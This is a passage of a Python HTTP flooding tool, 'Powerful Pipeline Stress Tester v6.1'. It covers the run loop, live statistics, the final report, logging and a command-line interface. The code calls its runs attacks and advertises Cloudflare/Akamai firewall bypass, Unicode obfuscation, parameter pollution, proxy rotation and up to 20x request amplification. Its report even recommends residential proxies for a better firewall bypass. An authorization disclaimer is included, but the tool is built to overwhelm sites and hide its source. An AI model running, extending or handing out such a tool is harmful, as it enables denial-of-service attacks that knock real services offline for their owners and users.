                        # Get pipeline stats
                        pipeline_stats = self.pipeline_manager.get_stats()
                        
                        # Calculate metrics
                        current_requests = pipeline_stats.get('total_requests', 0)
                        current_bytes = pipeline_stats.get('bytes_sent', 0)
                        
                        rps = (current_requests - last_request_count) / elapsed if elapsed > 0 else 0
                        bps = (current_bytes - last_bytes_count) / elapsed if elapsed > 0 else 0
                        
                        # Update peak RPS
                        if rps > self.stats['peak_rps']:
                            self.stats['peak_rps'] = rps
                        
                        # Update stats
                        self.stats['effective_rps'] = rps
                        self.stats['requests_sent'] = current_requests
                        self.stats['bytes_sent'] = current_bytes
                        self.stats['successful_responses'] = pipeline_stats.get('total_responses', 0)
                        self.stats['failed_responses'] = current_requests - pipeline_stats.get('total_responses', 0)
                        
                        # Get efficiency metrics
                        efficiency = pipeline_stats.get('pipelining_efficiency', 0)
                        success_rate = pipeline_stats.get('success_rate', 0)
                        active_pipes = pipeline_stats.get('active_pipelines', 0)
                        healthy_pipes = pipeline_stats.get('healthy_pipelines', 0)
                        avg_health = pipeline_stats.get('average_health_score', 0)
                        
                        # Performance tracking
                        performance_samples.append({
                            'timestamp': current_time,
                            'rps': rps,
                            'success_rate': success_rate,
                            'active_pipelines': active_pipes,
                            'health_score': avg_health
                        })
                        
                        # Keep last 100 samples
                        if len(performance_samples) > 100:
                            performance_samples = performance_samples[-100:]
                        
                        # Display stats
                        stats_line = (
                            f"\r{BC}[*]{W} RPS: {rps:7.0f} | "
                            f"Peak: {self.stats['peak_rps']:6.0f} | "
                            f"Queued: {self.stats['requests_queued']:7,} | "
                            f"Sent: {current_requests:8,} | "
                            f"Pipes: {healthy_pipes:2}/{active_pipes:2}/{self.pipeline_count} | "
                            f"Eff: {efficiency:5.1f}% | "
                            f"Success: {success_rate:5.1f}% | "
                            f"Health: {avg_health:4.1f} | "
                            f"MB: {current_bytes/(1024*1024):7.1f}"
                        )
                        
                        sys.stdout.write(stats_line)
                        sys.stdout.flush()
                        
                        # Store in history
                        self.performance_history.append({
                            'time': current_time - self.stats['start_time'],
                            'rps': rps,
                            'success_rate': success_rate
                        })
                        
                        last_update = current_time
                        last_request_count = current_requests
                        last_bytes_count = current_bytes
                    
                    await asyncio.sleep(0.1)
                    
                except asyncio.CancelledError:
                    break
                except Exception as e:
                    print(f"\n{R}[-]{W} Stats monitor error: {e}")
                    self.error_history.append({'type': 'stats_monitor', 'error': str(e), 'time': time.time()})
                    await asyncio.sleep(1)
                    
        except asyncio.CancelledError:
            print(f"\n{Y}[!]{W} Stats monitor cancelled")
        except Exception as e:
            print(f"\n{R}[-]{W} Stats monitor fatal error: {e}")
            self.error_history.append({'type': 'stats_monitor_fatal', 'error': str(e), 'time': time.time()})
    
    async def session_cleanup(self):
        """Clean up old sessions periodically"""
        while not self.stop_flag:
            try:
                await asyncio.sleep(30)
                cleaned = self.header_generator.cleanup_sessions()
                if cleaned > 0:
                    print(f"{C}[*]{W} Cleaned {cleaned} expired sessions")
            except asyncio.CancelledError:
                break
            except Exception as e:
                print(f"{R}[-]{W} Session cleanup error: {e}")
    
    async def run_stress_test(self):
        """Run the smart pipeline stress test with comprehensive monitoring"""
        print(f"\n{G}{'='*80}{W}")
        print(f"{G}[+] POWERFUL PIPELINE STRESS TESTER v6.1 - PRODUCTION READY{W}")
        print(f"{G}[+] CLOUDFLARE/AKAMAI BYPASS: {'ENABLED' if self.bypass_cloudflare else 'DISABLED'}{W}")
        print(f"{G}[+] PROXY SUPPORT: {'ENABLED' if self.use_proxies else 'DISABLED'}{W}")
        print(f"{G}{'='*80}{W}")
        
        # Display disclaimer and get authorization
        if not self.display_disclaimer():
            return {
                'success': False,
                'error': 'Authorization denied',
                'stats': self.stats
            }
        
        print(f"\n{C}{'='*80}{W}")
        print(f"{C}[*] TEST CONFIGURATION{W}")
        print(f"{C}{'='*80}{W}")
        print(f"{C}  Target URL:{W} {self.target}")
        print(f"{C}  Host:{W} {self.host}:{self.port}")
        print(f"{C}  SSL/TLS:{W} {'Enabled' if self.use_ssl else 'Disabled'}")
        print(f"{C}  Duration:{W} {self.duration} seconds")
        print(f"{C}  Pipeline Connections:{W} {self.pipeline_count}")
        print(f"{C}  Pipelining Factor:{W} {self.pipelining_factor}x")
        print(f"{C}  Worker Threads:{W} {self.max_workers}")
        print(f"{C}  Effective Concurrency:{W} {self.effective_concurrency}")
        print(f"{C}  Request Timeout:{W} {self.timeout}s")
        print(f"{C}  Cloudflare/Akamai Bypass:{W} {'Enabled' if self.bypass_cloudflare else 'Disabled'}")
        print(f"{C}  Proxy Rotation:{W} {'Enabled' if self.use_proxies else 'Disabled'}")
        print(f"{C}  Log Results:{W} {'Yes' if self.log_results else 'No'}")
        print(f"{C}{'='*80}{W}")
        
        self.stats['start_time'] = time.time()
        
        # Health check - test connection first
        print(f"\n{Y}[*]{W} Performing health check...")
        health_ok = await self._health_check()
        
        if not health_ok:
            print(f"{R}[-]{W} Health check failed. Target may be unreachable.")
            confirm = input(f"{Y}Continue anyway? (y/N): {W}").strip().lower()
            if confirm not in ['y', 'yes']:
                return {
                    'success': False,
                    'error': 'Health check failed',
                    'stats': self.stats
                }
        
        # Initialize pipeline manager
        self.pipeline_manager = PipelineManager(
            self.host,
            self.port,
            self.use_ssl,
            max_pipelines=self.pipeline_count,
            pipeline_timeout=self.timeout,
            bypass_waf=self.bypass_cloudflare,
            proxy_rotator=self.proxy_rotator
        )
        
        # Initialize pipelines
        pipeline_count = await self.pipeline_manager.initialize()
        
        if pipeline_count == 0:
            print(f"{R}[-]{W} No pipelines established. Exiting.")
            return {
                'success': False,
                'error': 'No pipelines could be established',
                'stats': self.stats
            }
        
        self.stats['total_connections'] = pipeline_count
        
        # Start monitoring tasks
        self.stats_task = asyncio.create_task(self.stats_monitor())
        self.session_cleanup_task = asyncio.create_task(self.session_cleanup())
        
        # Calculate worker parameters
        workers_count = min(self.max_workers, self.pipeline_count * 2)
        total_target_rps = self.effective_concurrency * 5  # Aggressive target
        
        # Cap RPS based on configuration
        max_rps = self.pipeline_count * 50  # Up to 50 req/s per pipeline
        total_target_rps = min(total_target_rps, max_rps)
        
        rps_per_worker = max(5, total_target_rps // max(1, workers_count))
        
        print(f"\n{C}[*]{W} Starting {workers_count} workers")
        print(f"{C}[*]{W} Target RPS: {total_target_rps} ({rps_per_worker} per worker)")
        print(f"{G}[+]{W} Attack started at {time.strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"{G}[+]{W} Press Ctrl+C to stop or wait for timeout\n")
        
        self.stats['worker_count'] = workers_count
        
        # Start worker tasks with staggered startup
        for i in range(workers_count):
            worker_task = asyncio.create_task(
                self.pipeline_worker(i, rps_per_worker)
            )
            self.worker_tasks.append(worker_task)
            await asyncio.sleep(0.2)  # Stagger worker starts
        
        try:
            # Run for specified duration with progress indicator
            remaining = self.duration
            while remaining > 0 and not self.stop_flag:
                await asyncio.sleep(1)
                remaining -= 1
                
                # Show progress every 10 seconds
                if remaining % 10 == 0 and remaining > 0:
                    print(f"\n{Y}[*]{W} {remaining} seconds remaining...")
            
            # Stop attack
            result = await self._stop_attack()
            return result
            
        except KeyboardInterrupt:
            print(f"\n{Y}[!]{W} Attack interrupted by user")
            result = await self._stop_attack()
            result['interrupted'] = True
            return result
        
        except Exception as e:
            print(f"\n{R}[-]{W} Attack error: {e}")
            self.error_history.append({'type': 'attack_fatal', 'error': str(e), 'time': time.time()})
            result = await self._stop_attack()
            result['error'] = str(e)
            return result
    
    async def _health_check(self) -> bool:
        """Perform health check on target"""
        try:
            # Simple TCP connection test
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(self.host, self.port),
                timeout=5.0
            )
            writer.close()
            await writer.wait_closed()
            
            self.stats['health_check_passed'] += 1
            print(f"{G}[+]{W} Health check passed")
            return True
        except Exception as e:
            self.stats['health_check_failed'] += 1
            print(f"{R}[-]{W} Health check failed: {e}")
            return False
    
    async def _stop_attack(self):
        """Stop attack cleanly and collect final statistics"""
        print(f"\n{C}[*]{W} Stopping attack and collecting final statistics...")
        
        # Set stop flag
        self.stop_flag = True
        
        # Cancel worker tasks
        for task in self.worker_tasks:
            if not task.done():
                task.cancel()
        
        # Wait for workers to finish
        if self.worker_tasks:
            try:
                await asyncio.gather(*self.worker_tasks, return_exceptions=True)
            except:
                pass
        
        # Stop monitoring tasks
        if self.stats_task and not self.stats_task.done():
            self.stats_task.cancel()
            try:
                await self.stats_task
            except asyncio.CancelledError:
                pass
        
        if self.session_cleanup_task and not self.session_cleanup_task.done():
            self.session_cleanup_task.cancel()
            try:
                await self.session_cleanup_task
            except asyncio.CancelledError:
                pass
        
        # Cleanup pipelines
        if self.pipeline_manager:
            await self.pipeline_manager.close_all()
        
        # Final stats
        result = await self._display_final_stats()
        
        # Log results if enabled
        if self.log_results:
            await self._log_results(result)
        
        return result
    
    async def _display_final_stats(self):
        """Display final statistics and return results"""
        print()  # New line after stats line
        elapsed = time.time() - self.stats['start_time']
        
        print(f"\n{G}{'='*85}{W}")
        print(f"{G}[*] POWERFUL PIPELINING STRESS TEST - FINAL REPORT{W}")
        print(f"{G}{'='*85}{W}")
        print(f"{C}[+] Target:{W} {self.target}")
        print(f"{C}[+] Duration:{W} {elapsed:.1f} seconds")
        print(f"{C}[+] Workers:{W} {self.stats['worker_count']}")
        print(f"{C}[+] Cloudflare/Akamai Bypass:{W} {'Enabled' if self.bypass_cloudflare else 'Disabled'}")
        print(f"{C}[+] Proxy Rotation:{W} {'Enabled' if self.use_proxies else 'Disabled'}")
        print(f"{G}{'-'*85}{W}")
        
        final_stats = {}
        
        if self.pipeline_manager:
            pipeline_stats = self.pipeline_manager.get_stats()
            
            # Display detailed statistics
            print(f"{C}[+] Physical Pipelines:{W} {pipeline_stats.get('total_pipelines', 0)}")
            print(f"{C}[+] Active Pipelines:{W} {pipeline_stats.get('active_pipelines', 0)}")
            print(f"{C}[+] Healthy Pipelines:{W} {pipeline_stats.get('healthy_pipelines', 0)}")
            print(f"{C}[+] Total Requests:{W} {pipeline_stats.get('total_requests', 0):,}")
            print(f"{C}[+] Successful Responses:{W} {pipeline_stats.get('total_responses', 0):,}")
            print(f"{C}[+] Success Rate:{W} {pipeline_stats.get('success_rate', 0):.1f}%")
            print(f"{C}[+] Pipelined Requests:{W} {pipeline_stats.get('pipelined_requests', 0):,}")
            print(f"{C}[+] Pipelining Efficiency:{W} {pipeline_stats.get('pipelining_efficiency', 0):.1f}%")
            print(f"{C}[+] Average RPS:{W} {pipeline_stats.get('requests_per_second', 0):.0f}")
            print(f"{C}[+] Peak RPS:{W} {self.stats['peak_rps']:.0f}")
            print(f"{C}[+] Total Data Sent:{W} {pipeline_stats.get('bytes_sent', 0) / (1024*1024):.2f} MB")
            print(f"{C}[+] Average Health Score:{W} {pipeline_stats.get('average_health_score', 0):.1f}")
            print(f"{C}[+] Reconnections:{W} {pipeline_stats.get('reconnections', 0)}")
            print(f"{G}{'-'*85}{W}")
            
            # Performance metrics - FIXED: Initialize amplification variable
            amplification = 0.0
            efficiency_score = 0.0
            
            if pipeline_stats.get('total_pipelines', 0) > 0:
                amplification = pipeline_stats.get('requests_per_second', 0) / max(1, pipeline_stats.get('total_pipelines', 1))
                efficiency_score = (pipeline_stats.get('pipelining_efficiency', 0) * pipeline_stats.get('success_rate', 0)) / 100
                
                print(f"{Y}[*] Performance Metrics:{W}")
                print(f"  Amplification Factor: {amplification:.1f}x")
                print(f"  Effective vs Physical: {self.effective_concurrency}:{self.pipeline_count}")
                print(f"  Requests per Pipeline: {pipeline_stats.get('total_requests', 0) / max(1, pipeline_stats.get('total_pipelines', 1)):.0f}")
                print(f"  Data Rate: {pipeline_stats.get('bytes_sent', 0) / elapsed / 1024:.1f} KB/s")
                print(f"  Efficiency Score: {efficiency_score:.2f}/1.0")
            
            # Error analysis
            if self.error_history:
                print(f"{R}[*] Error Analysis:{W}")
                error_types = {}
                for error in self.error_history:
                    error_types[error['type']] = error_types.get(error['type'], 0) + 1
                
                for err_type, count in error_types.items():
                    print(f"  {err_type}: {count} occurrences")
            
            # Recommendations
            print(f"{G}[*] Recommendations:{W}")
            success_rate = pipeline_stats.get('success_rate', 0)
            
            if success_rate > 80:
                print(f"  {G}✓{W} Excellent performance - target is responsive")
            elif success_rate > 50:
                print(f"  {Y}⚠{W} Moderate performance - consider reducing load")
            else:
                print(f"  {R}✗{W} Poor performance - target may be overwhelmed or blocking")
            
            # Only check amplification if we have pipelines
            if pipeline_stats.get('total_pipelines', 0) > 0:
                if amplification < 2:
                    print(f"  {Y}⚠{W} Low pipelining efficiency - consider adjusting pipelining_factor")
            
            # WAF bypass effectiveness
            if self.bypass_cloudflare:
                if success_rate > 70:
                    print(f"  {G}✓{W} Cloudflare/Akamai bypass appears effective")
                else:
                    print(f"  {Y}⚠{W} Cloudflare/Akamai may still be blocking some requests")
            
            # Proxy effectiveness
            if self.use_proxies:
                print(f"  {C}[*]{W} Proxy rotation was enabled during test")
            
            # Prepare final stats for return
            final_stats = {
                'target': self.target,
                'duration': elapsed,
                'configuration': {
                    'pipelines': self.pipeline_count,
                    'pipelining_factor': self.pipelining_factor,
                    'workers': self.max_workers,
                    'timeout': self.timeout,
                    'ssl_enabled': self.use_ssl,
                    'cloudflare_bypass': self.bypass_cloudflare,
                    'proxy_rotation': self.use_proxies
                },
                'performance': {
                    'pipelines_established': pipeline_stats.get('total_pipelines', 0),
                    'pipelines_active': pipeline_stats.get('active_pipelines', 0),
                    'pipelines_healthy': pipeline_stats.get('healthy_pipelines', 0),
                    'total_requests': pipeline_stats.get('total_requests', 0),
                    'successful_responses': pipeline_stats.get('total_responses', 0),
                    'success_rate': pipeline_stats.get('success_rate', 0),
                    'average_rps': pipeline_stats.get('requests_per_second', 0),
                    'peak_rps': self.stats['peak_rps'],
                    'pipelining_efficiency': pipeline_stats.get('pipelining_efficiency', 0),
                    'total_data_sent_mb': pipeline_stats.get('bytes_sent', 0) / (1024*1024),
                    'reconnections': pipeline_stats.get('reconnections', 0),
                    'amplification_factor': amplification,
                    'average_health_score': pipeline_stats.get('average_health_score', 0)
                },
                'errors': self.error_history,
                'recommendations': []
            }
            
            # Add recommendations to results
            if success_rate < 50:
                final_stats['recommendations'].append("Reduce pipeline count or increase timeout")
            if pipeline_stats.get('total_pipelines', 0) > 0 and amplification < 2:
                final_stats['recommendations'].append("Increase pipelining_factor for better efficiency")
            if pipeline_stats.get('average_health_score', 0) < 70:
                final_stats['recommendations'].append("Check network stability and target responsiveness")
            if self.bypass_cloudflare and success_rate < 70:
                final_stats['recommendations'].append("Consider using residential proxies for better WAF bypass")
        
        print(f"{G}{'='*85}{W}")
        
        return {
            'success': True,
            'message': 'Stress test completed successfully',
            'stats': final_stats if final_stats else self.stats
        }
    
    async def _log_results(self, result: Dict):
        """Log results to file"""
        try:
            timestamp = time.strftime("%Y%m%d_%H%M%S")
            filename = f"stress_test_{self.host}_{timestamp}.json"
            
            # Create logs directory if it doesn't exist
            os.makedirs("logs", exist_ok=True)
            filepath = os.path.join("logs", filename)
            
            with open(filepath, 'w', encoding='utf-8') as f:
                json.dump(result, f, indent=2, ensure_ascii=False)
            
            print(f"{G}[+] Results saved to: {filepath}{W}")
            
            # Also save a summary CSV
            csv_filename = f"stress_test_{self.host}_{timestamp}.csv"
            csv_filepath = os.path.join("logs", csv_filename)
            
            if result.get('stats', {}).get('performance'):
                perf = result['stats']['performance']
                with open(csv_filepath, 'w', encoding='utf-8') as f:
                    f.write("Metric,Value\n")
                    f.write(f"Target,{result['stats'].get('target', 'N/A')}\n")
                    f.write(f"Duration,{result['stats'].get('duration', 0):.1f}\n")
                    f.write(f"Total Requests,{perf.get('total_requests', 0)}\n")
                    f.write(f"Success Rate,{perf.get('success_rate', 0):.1f}\n")
                    f.write(f"Average RPS,{perf.get('average_rps', 0):.0f}\n")
                    f.write(f"Peak RPS,{perf.get('peak_rps', 0):.0f}\n")
                    f.write(f"Data Sent MB,{perf.get('total_data_sent_mb', 0):.2f}\n")
                
                print(f"{G}[+] Summary saved to: {csv_filepath}{W}")
                
        except Exception as e:
            print(f"{R}[-] Failed to log results: {e}{W}")

# ============================================================================
# UNIVERSAL ORCHESTRATOR COMPATIBLE RUN FUNCTION
# ============================================================================
async def run_async(inputs: Dict, options: Dict) -> Dict:
    """
    Main run function compatible with UniversalOrchestrator
    This is the entry point called by the orchestrator
    """
    try:
        # Extract inputs with validation
        target = inputs.get('target', 'http://example.com')
        
        # Validate URL
        if not target.startswith(('http://', 'https://')):
            return {
                'success': False,
                'error': 'Target must start with http:// or https://',
                'stats': {}
            }
        
        duration = int(inputs.get('duration', 60))
        if duration < 1 or duration > 3600:
            return {
                'success': False,
                'error': 'Duration must be between 1 and 3600 seconds',
                'stats': {}
            }
        
        pipelines = int(inputs.get('pipelines', 15))
        if pipelines < 1 or pipelines > 100:
            return {
                'success': False,
                'error': 'Pipeline count must be between 1 and 100',
                'stats': {}
            }
        
        pipelining_factor = int(inputs.get('pipelining_factor', 5))
        if pipelining_factor < 1 or pipelining_factor > 20:
            return {
                'success': False,
                'error': 'Pipelining factor must be between 1 and 20',
                'stats': {}
            }
        
        max_workers = int(inputs.get('max_workers', 10))
        if max_workers < 1 or max_workers > 50:
            return {
                'success': False,
                'error': 'Worker count must be between 1 and 50',
                'stats': {}
            }
        
        timeout = int(inputs.get('timeout', 10))
        if timeout < 1 or timeout > 30:
            return {
                'success': False,
                'error': 'Timeout must be between 1 and 30 seconds',
                'stats': {}
            }
        
        enable_ssl = bool(inputs.get('enable_ssl', True))
        log_results = bool(inputs.get('log_results', True))
        bypass_cloudflare = bool(inputs.get('bypass_cloudflare', True))
        use_proxies = bool(inputs.get('use_proxies', False))
        
        # Get proxy list from options if available
        proxy_list = []
        if use_proxies and options:
            if 'proxy_list' in options:
                proxy_list = options['proxy_list']
            elif 'get_proxy' in options and callable(options['get_proxy']):
                proxy = options['get_proxy']()
                if proxy:
                    proxy_list = [proxy]
        
        # Create and run tester
        tester = PowerfulPipelineStressTester(
            target=target,
            duration=duration,
            pipeline_count=pipelines,
            pipelining_factor=pipelining_factor,
            max_workers=max_workers,
            timeout=timeout,
            enable_ssl=enable_ssl,
            log_results=log_results,
            bypass_cloudflare=bypass_cloudflare,
            use_proxies=use_proxies
        )
        
        # Add proxies if available
        if use_proxies and proxy_list and hasattr(tester, 'proxy_rotator'):
            for proxy in proxy_list[:20]:  # Limit to 20 proxies
                tester.proxy_rotator.add_proxy(proxy)
        
        result = await tester.run_stress_test()
        return result
        
    except ValueError as e:
        return {
            'success': False,
            'error': f"Input validation error: {str(e)}",
            'stats': {}
        }
    except Exception as e:
        import traceback
        traceback.print_exc()
        return {
            'success': False,
            'error': f"Error running stress test: {str(e)}",
            'stats': {}
        }

def run(inputs: Dict, options: Dict) -> Dict:
    """
    Synchronous wrapper for async run function
    Called by UniversalOrchestrator
    """
    try:
        # Run the async function
        return asyncio.run(run_async(inputs, options))
    except Exception as e:
        import traceback
        traceback.print_exc()
        return {
            'success': False,
            'error': f"Fatal error: {str(e)}",
            'stats': {}
        }

# ============================================================================
# COMMAND LINE INTERFACE
# ============================================================================
def display_banner():
    """Display tool banner"""
    banner = f"""{R}
    ╔══════════════════════════════════════════════════════════════╗
    ║    POWERFUL PIPELINE STRESS TESTER v6.1 - PRODUCTION READY   ║
    ║       HTTP/1.1 Pipelining & Intelligent Multiplexing         ║
    ║         Advanced Firewall Bypass & Proxy Support             ║
    ╚══════════════════════════════════════════════════════════════╝
    {G}────────────────────────────────────────────────────────────{W}
    {C}Features:{W}
    • HTTP/1.1 Pipelining (Up to 20x Amplification)
    • Intelligent Connection Multiplexing & Load Balancing
    • Behavioral Headers with Session Management
    • Advanced Cloudflare/Akamai WAF Bypass
    • Unicode Obfuscation & Parameter Pollution
    • Proxy Rotation Support
    • Smart Request Generation & Adaptive Rate Limiting
    • Health Monitoring & Automatic Error Recovery
    • Real-time Statistics & Performance Analytics
    • Comprehensive Error Reporting & Recommendations
    • Production-Ready with Logging & Result Export
    • UniversalOrchestrator Integration Ready
    {Y}⚠️  FOR AUTHORIZED SECURITY TESTING ONLY!{W}
    {R}────────────────────────────────────────────────────────────{W}"""
    print(banner)

def main():
    """Main function with enhanced command line interface"""
    parser = argparse.ArgumentParser(
        description='Powerful Pipeline Stress Tester v6.1 - Production Ready with Advanced Firewall Bypass',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
{G}Examples:{W}
  {C}python stress_tester.py https://target.com -d 120 -p 25{W}
  {C}python stress_tester.py http://192.168.1.1 -d 60 -p 15 --workers 12{W}
  {C}python stress_tester.py https://api.example.com -d 300 -p 30 --factor 8{W}
  {C}python stress_tester.py https://cloudflare-protected.com -d 180 -p 20 --no-cf-bypass{W}
  {C}python stress_tester.py https://target.com -d 120 -p 20 --use-proxies{W}

{Y}Performance Guidelines:{W}
  • Max Pipelines: {MAX_CONCURRENT_CONNECTIONS}
  • Default Pipelining Factor: {DEFAULT_PIPELINING_FACTOR}x
  • Recommended Duration: 30-300 seconds
  • Each pipeline can handle {MAX_PIPELINED_REQUESTS} pipelined requests
  • Effective concurrency = pipelines × pipelining_factor

{R}Legal Requirements:{W}
  • You MUST have written permission to test the target
  • Use ONLY on systems you own or have authorization for
  • Compliance with local laws is YOUR responsibility
        """
    )
    
    parser.add_argument('target', nargs='?', help='Target URL (http:// or https://)')
    parser.add_argument('-d', '--duration', type=int, default=60,
                       help=f'Attack duration in seconds (1-{MAX_DURATION}, default: 60)')
    parser.add_argument('-p', '--pipelines', type=int, default=15,
                       help=f'Number of pipeline connections (1-{MAX_CONCURRENT_CONNECTIONS}, default: 15)')
    parser.add_argument('-f', '--factor', type=int, default=DEFAULT_PIPELINING_FACTOR,
                       help=f'Pipelining amplification factor (1-20, default: {DEFAULT_PIPELINING_FACTOR})')
    parser.add_argument('-w', '--workers', type=int, default=DEFAULT_MAX_WORKERS,
                       help=f'Worker threads (1-50, default: {DEFAULT_MAX_WORKERS})')
    parser.add_argument('-t', '--timeout', type=int, default=REQUEST_TIMEOUT,
                       help=f'Connection timeout in seconds (1-30, default: {REQUEST_TIMEOUT})')
    parser.add_argument('--no-ssl', action='store_true',
                       help='Disable SSL/TLS (use with http:// targets)')
    parser.add_argument('--no-log', action='store_true',
                       help='Disable result logging')
    parser.add_argument('--no-cf-bypass', action='store_true',
                       help='Disable Cloudflare/Akamai bypass')
    parser.add_argument('--use-proxies', action='store_true',
                       help='Enable proxy rotation (requires proxy list in options)')
    parser.add_argument('--no-color', action='store_true',
                       help='Disable colored output')
    
    args = parser.parse_args()
    
    # Handle color disabling
    if args.no_color:
        # Use a function to temporarily override colors
        def disable_colors():
            global R, G, Y, B, M, C, W, RS, BR, BG, BY, BB, BM, BC, BW
            R = G = Y = B = M = C = W = RS = BR = BG = BY = BB = BM = BC = BW = ''
        
        disable_colors()
    
    # Display banner
    display_banner()
    
    # Check if target provided
    if not args.target:
        print(f"\n{R}[!] Error: Target URL required{W}")
        print(f"{C}Usage: python stress_tester.py <target_url> [options]{W}")
        sys.exit(1)
    
    # Validate inputs
    args.pipelines = max(1, min(args.pipelines, MAX_CONCURRENT_CONNECTIONS))
    args.factor = max(1, min(args.factor, 20))
    args.workers = max(1, min(args.workers, 50))
    args.timeout = max(1, min(args.timeout, 30))
    args.duration = max(1, min(args.duration, MAX_DURATION))
    
    # Summary
    effective_concurrency = args.pipelines * args.factor
    
    print(f"\n{G}{'='*70}{W}")
    print(f"{C}ATTACK CONFIGURATION:{W}")
    print(f"{C}  Target: {args.target}{W}")
    print(f"{C}  Duration: {args.duration} seconds{W}")
    print(f"{C}  Pipelines: {args.pipelines}{W}")
    print(f"{C}  Pipelining Factor: {args.factor}x{W}")
    print(f"{C}  Workers: {args.workers}{W}")
    print(f"{C}  Timeout: {args.timeout}s{W}")
    print(f"{C}  SSL/TLS: {'Disabled' if args.no_ssl else 'Auto-detect'}{W}")
    print(f"{C}  Cloudflare/Akamai Bypass: {'Disabled' if args.no_cf_bypass else 'Enabled'}{W}")
    print(f"{C}  Proxy Rotation: {'Disabled' if not args.use_proxies else 'Enabled'}{W}")
    print(f"{C}  Logging: {'Disabled' if args.no_log else 'Enabled'}{W}")
    print(f"{C}  Effective Concurrency: {effective_concurrency}{W}")
    print(f"{G}{'='*70}{W}\n")
    
    # Run stress test
    tester = PowerfulPipelineStressTester(
        target=args.target,
        duration=args.duration,
        pipeline_count=args.pipelines,
        pipelining_factor=args.factor,
        max_workers=args.workers,
        timeout=args.timeout,
        enable_ssl=not args.no_ssl,
        log_results=not args.no_log,
        bypass_cloudflare=not args.no_cf_bypass,
        use_proxies=args.use_proxies
    )
    
    try:
        result = asyncio.run(tester.run_stress_test())
        
        # Exit code based on result
        if result.get('success'):
            sys.exit(0)
        else:
            sys.exit(1)
            
    except KeyboardInterrupt:
        print(f"\n{Y}[*] Tool interrupted by user.{W}")
        sys.exit(130)
    except Exception as e:
        print(f"\n{R}[!] Fatal error: {e}{W}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()